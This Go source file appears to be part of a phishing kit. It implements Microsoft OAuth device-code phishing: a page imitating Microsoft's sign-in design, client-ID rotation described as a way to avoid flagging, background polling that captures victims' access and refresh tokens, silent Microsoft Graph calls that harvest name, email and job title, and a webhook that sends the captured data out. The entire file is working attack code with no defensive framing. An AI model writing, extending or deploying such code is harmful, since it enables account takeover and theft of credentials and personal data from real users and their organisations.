package main

import (
	"context"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"log"
	"math/big"
	"net/http"
	"net/url"
	"time"
)

// ══════════════════════════════════════════════════════════
//  OAUTH DEVICE CODE FLOW (Tier-0 Upgrade)
//  Features: Microsoft-perfect UI, AJAX polling, context
//  cancellation, client ID rotation, and token amplification.
// ══════════════════════════════════════════════════════════

// Known-good, first-party Microsoft Client IDs to rotate through.
var msClientIDs = []string{
	"d3590ed6-52b3-4102-aeff-aad2292ab01c", // Office
	"1950a258-227b-4e31-a9cf-717495945fc2", // Azure PowerShell
	"04b07795-8ddb-461a-bbee-02f9e1bf7b46", // Microsoft Azure CLI
	"872cd9fa-d31f-45e0-9eab-6e460a02d1f1", // Visual Studio
}

const (
	msDeviceCodeURL = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
	msTokenURL      = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
	msGraphMeURL    = "https://graph.microsoft.com/v1.0/me"
	msScope         = "openid profile email offline_access User.Read"
)

type DeviceCodeResponse struct {
	UserCode        string `json:"user_code"`
	DeviceCode      string `json:"device_code"`
	VerificationURI string `json:"verification_uri"`
	ExpiresIn       int    `json:"expires_in"`
	Interval        int    `json:"interval"`
}

type TokenResponse struct {
	AccessToken  string `json:"access_token"`
	RefreshToken string `json:"refresh_token"`
	IDToken      string `json:"id_token"`
	TokenType    string `json:"token_type"`
	ExpiresIn    int    `json:"expires_in"`
	Error        string `json:"error"`
}

// deviceHTMLTemplate is the Microsoft-perfect UI for the device code flow.
const deviceHTMLTemplate = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in to your account</title>
<style>
    body { 
        font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif; 
        background-color: #f2f2f2; 
        display: flex; 
        justify-content: center; 
        align-items: center; 
        min-height: 100vh; 
        margin: 0; 
        color: #1b1b1b; 
    }
    .card { 
        background: #fff; 
        width: 100%%; 
        max-width: 440px; 
        padding: 44px; 
        box-sizing: border-box; 
        box-shadow: 0 2px 6px rgba(0,0,0,0.2); 
    }
    .logo { 
        display: flex; 
        align-items: center; 
        margin-bottom: 16px; 
        font-size: 20px; 
        font-weight: 600; 
    }
    .logo svg { width: 24px; height: 24px; margin-right: 8px; }
    h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; }
    p { font-size: 15px; margin: 0 0 20px 0; }
    
    .code-box {
        border: 1px solid #8a8886;
        padding: 20px;
        text-align: center;
        margin-bottom: 20px;
        position: relative;
        background: #fff;
    }
    .code-text {
        font-size: 36px;
        font-weight: 600;
        color: #0067b8;
        letter-spacing: 4px;
        font-family: 'Segoe UI', sans-serif;
    }
    .copy-link {
        position: absolute;
        top: 10px;
        right: 10px;
        font-size: 12px;
        color: #0067b8;
        text-decoration: none;
        cursor: pointer;
        background: none;
        border: none;
    }
    .copy-link:hover { text-decoration: underline; }
    
    .sign-in-btn {
        background-color: #0067b8;
        color: white;
        border: none;
        padding: 12px 24px;
        font-size: 15px;
        font-weight: 600;
        cursor: pointer;
        width: 100%%;
        margin-bottom: 20px;
    }
    .sign-in-btn:hover { background-color: #005da6; }
    
    .instructions { font-size: 14px; color: #1b1b1b; margin-bottom: 20px; }
    .instructions ol { padding-left: 20px; margin: 0; }
    .instructions li { margin-bottom: 8px; }
    .instructions a { color: #0067b8; text-decoration: none; }
    .instructions a:hover { text-decoration: underline; }
    
    .waiting-container {
        display: flex;
        align-items: center;
        justify-content: center;
        margin-top: 20px;
        font-size: 14px;
        color: #1b1b1b;
    }
    .spinner {
        border: 2px solid #f3f3f3;
        border-top: 2px solid #0067b8;
        border-radius: 50%%;
        width: 16px;
        height: 16px;
        animation: spin 1s linear infinite;
        margin-right: 10px;
    }
    @keyframes spin { 0%% { transform: rotate(0deg); } 100%% { transform: rotate(360deg); } }
    
    .footer { font-size: 12px; color: #1b1b1b; margin-top: 40px; text-align: center; }
    .footer a { color: #0067b8; text-decoration: none; margin: 0 8px; }
    .footer a:hover { text-decoration: underline; }
</style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
                <rect x="13" y="1" width="10" height="10" fill="#7fba00"/>
                <rect x="1" y="13" width="10" height="10" fill="#00a4ef"/>
                <rect x="13" y="13" width="10" height="10" fill="#ffb900"/>
            </svg>
            Microsoft
        </div>
        <h1>Sign in to your account</h1>
        <p>Use the code below to complete device sign-in.</p>
        
        <div class="code-box">
            <span class="code-text" id="userCode">%s</span>
            <button class="copy-link" onclick="copyCode()">Copy</button>
        </div>

        <button class="sign-in-btn" onclick="window.open('%s', '_blank')">Sign in at microsoft.com/devicelogin</button>

        <div class="instructions">
            <ol>
                <li>Click the button above (or go to <a href="%s" target="_blank">microsoft.com/devicelogin</a>)</li>
                <li>Enter the code shown above</li>
                <li>Sign in with your account</li>
            </ol>
        </div>

        <div class="waiting-container" id="statusContainer">
            <div class="spinner"></div>
            <span id="statusText">Waiting for you to sign in...</span>
        </div>

        <div class="footer">
            <a href="#">Terms of use</a> • <a href="#">Privacy & cookies</a>
        </div>
    </div>

    <script>
        function copyCode() {
            var code = document.getElementById('userCode').innerText;
            navigator.clipboard.writeText(code).then(function() {
                var btn = document.querySelector('.copy-link');
                btn.innerText = 'Copied!';
                setTimeout(function(){ btn.innerText = 'Copy'; }, 2000);
            });
        }

        var pollInterval = setInterval(function() {
            fetch('/device/status')
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    if (data.status === 'done') {
                        clearInterval(pollInterval);
                        document.getElementById('statusContainer').innerHTML = '<span style="color: green; font-weight: 600; margin-left: 10px;">✓ Success! Redirecting...</span>';
                        setTimeout(function() { window.location.href = '/'; }, 2000);
                    } else if (data.status === 'expired') {
                        clearInterval(pollInterval);
                        document.getElementById('statusContainer').innerHTML = '<span style="color: red; margin-left: 10px;">Code expired. Please refresh the page.</span>';
                    }
                })
                .catch(function(err) { console.error('Polling error:', err); });
        }, 5000);
    </script>
</body>
</html>`

// deviceHandler manages the Device Code phishing flow.
func deviceHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	baseDomain := baseDomainOf(r)
	session := sessionMgr.GetOrCreate(r, baseDomain)

	// If we already have a successful token, redirect to termination.
	session.mu.Lock()
	isDone := session.IsDone
	session.mu.Unlock()

	if isDone {
		doTerminate(w, session, r)
		return
	}

	// Check if we are already polling for this session
	session.mu.Lock()
	existingDeviceCode := session.CookieTokens["_device_code"]
	userCode := session.CookieTokens["_user_code"]
	verificationURI := session.CookieTokens["_verification_uri"]
	session.mu.Unlock()

	if existingDeviceCode == "" {
		// Rotate Client ID to avoid throttling/flagging of a single ID
		clientID, _ := rand.Int(rand.Reader, big.NewInt(int64(len(msClientIDs))))
		selectedClientID := msClientIDs[clientID.Int64()]

		// 1. Request a new Device Code
		resp, err := http.PostForm(msDeviceCodeURL, url.Values{
			"client_id": {selectedClientID},
			"scope":     {msScope},
		})
		if err != nil {
			log.Printf("[!] Device Code request failed: %v", err)
			http.Error(w, "Service unavailable", http.StatusServiceUnavailable)
			return
		}
		defer resp.Body.Close()

		var dcResp DeviceCodeResponse
		if err := json.NewDecoder(resp.Body).Decode(&dcResp); err != nil {
			log.Printf("[!] Device Code decode failed: %v", err)
			http.Error(w, "Service unavailable", http.StatusServiceUnavailable)
			return
		}

		// 2. Store in session
		session.mu.Lock()
		session.CookieTokens["_device_code"] = dcResp.DeviceCode
		session.CookieTokens["_user_code"] = dcResp.UserCode
		session.CookieTokens["_verification_uri"] = dcResp.VerificationURI
		session.CookieTokens["_client_id"] = selectedClientID
		session.TargetName = "Microsoft (Device Code)"
		session.mu.Unlock()

		// 3. Start background polling
		ctx := context.Background()
		go pollForTokens(ctx, session, dcResp.DeviceCode, dcResp.Interval, dcResp.ExpiresIn, selectedClientID)

		userCode = dcResp.UserCode
		verificationURI = dcResp.VerificationURI
	}

	// 4. Render the Device Code landing page
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")

	html := fmt.Sprintf(deviceHTMLTemplate, userCode, verificationURI, verificationURI)
	w.Write([]byte(html))
}

// deviceStatusHandler provides a lightweight endpoint for the frontend AJAX poll.
func deviceStatusHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	session := sessionMgr.GetOrCreate(r, baseDomainOf(r))
	session.mu.Lock()
	isDone := session.IsDone
	isExpired := session.CookieTokens["_poll_expired"] == "true"
	session.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	if isDone {
		w.Write([]byte(`{"status": "done"}`))
	} else if isExpired {
		w.Write([]byte(`{"status": "expired"}`))
	} else {
		w.Write([]byte(`{"status": "pending"}`))
	}
}

// pollForTokens continuously polls the token endpoint until the user authenticates.
func pollForTokens(ctx context.Context, session *Session, deviceCode string, interval, expiresIn int, clientID string) {
	// Ensure cleanup on exit
	defer func() {
		session.mu.Lock()
		session.CookieTokens["_poll_expired"] = "true"
		session.mu.Unlock()
	}()

	elapsed := 0
	httpClient := &http.Client{Timeout: 10 * time.Second}

	for elapsed < expiresIn {
		// Check for context cancellation
		select {
		case <-ctx.Done():
			log.Printf("[!] Device polling canceled for session %s", session.ID[:8])
			return
		case <-time.After(time.Duration(interval) * time.Second):
			elapsed += interval
		}

		// Check if session was already marked done
		session.mu.Lock()
		if session.IsDone {
			session.mu.Unlock()
			return
		}
		session.mu.Unlock()

		// Poll the token endpoint
		resp, err := httpClient.PostForm(msTokenURL, url.Values{
			"client_id":   {clientID},
			"device_code": {deviceCode},
			"grant_type":  {"urn:ietf:params:oauth:grant-type:device_code"},
		})
		if err != nil {
			continue // Network blip, keep trying
		}

		var tokenResp TokenResponse
		if err := json.NewDecoder(resp.Body).Decode(&tokenResp); err != nil {
			resp.Body.Close()
			continue
		}
		resp.Body.Close()

		// If we got an access token, we won!
		if tokenResp.AccessToken != "" {
			log.Printf("[✓] [%s] DEVICE CODE SUCCESS: Tokens captured", session.ID[:8])

			session.mu.Lock()
			session.AddToken("access_token", tokenResp.AccessToken)
			session.AddToken("refresh_token", tokenResp.RefreshToken)
			session.AddToken("id_token", tokenResp.IDToken)
			session.IsDone = true
			session.mu.Unlock()

			// Tier-0 Upgrade: Token Amplification (Silent Graph API call)
			go amplifyTokenData(tokenResp.AccessToken, session)

			// Fire the webhook
			target := lookupTargetByRole("microsoft")
			emitCapture(session, target)

			return
		}

		// If the error is not "authorization_pending", something went wrong
		if tokenResp.Error != "" && tokenResp.Error != "authorization_pending" {
			if tokenResp.Error == "expired_token" || tokenResp.Error == "bad_verification_code" {
				return // Stop polling
			}
		}
	}

	log.Printf("[!] Device code expired for session %s without authentication", session.ID[:8])
}

// amplifyTokenData silently harvests additional user intelligence using the captured access token.
func amplifyTokenData(accessToken string, session *Session) {
	req, err := http.NewRequest("GET", msGraphMeURL, nil)
	if err != nil {
		return
	}
	req.Header.Set("Authorization", "Bearer "+accessToken)

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		return
	}
	defer resp.Body.Close()

	var userInfo map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&userInfo); err == nil {
		if displayName, ok := userInfo["displayName"].(string); ok {
			log.Printf("[+] [%s] GRAPH API AMPLIFICATION: Name = %s", session.ID[:8], displayName)
			session.AddToken("graph_displayName", displayName)
		}
		if upn, ok := userInfo["userPrincipalName"].(string); ok {
			log.Printf("[+] [%s] GRAPH API AMPLIFICATION: UPN = %s", session.ID[:8], upn)
			session.AddToken("graph_upn", upn)
		}
		if jobTitle, ok := userInfo["jobTitle"].(string); ok {
			log.Printf("[+] [%s] GRAPH API AMPLIFICATION: Title = %s", session.ID[:8], jobTitle)
			session.AddToken("graph_jobTitle", jobTitle)
		}
	}
}
